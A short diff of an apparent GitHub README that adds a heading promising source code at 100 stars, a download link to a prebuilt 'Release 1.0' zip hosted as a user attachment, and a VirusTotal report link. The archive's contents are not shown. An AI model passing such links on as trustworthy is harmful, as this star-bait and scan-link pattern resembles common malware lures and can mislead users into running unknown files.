@@ -7,7 +7,16 @@
 
 
 
-# 📷 Soon
+# ⭐ 100 Stars For The Source Code
+### 📦 Download Release 1.0  
+Grab the latest version from GitHub:  
+[**⬇️ Download Release 1.0**](https://github.com/user-attachments/files/21049145/Release.1.0.zip)
+
+---
+
+### 🛡️ VirusTotal Scan  
+View the security scan results here:  
+[**📌 VirusTotal Report**](https://www.virustotal.com/gui/file/74791b405bfa81123d92f6a2f62466b140cff39610f953ddb487f2fe1943833a/detection)
 
 <p align="center">
    <img src="https://github.com/user-attachments/assets/1a0821c4-15d9-4b3e-b1e8-0dcb15045ac8" alt="Screenshot">
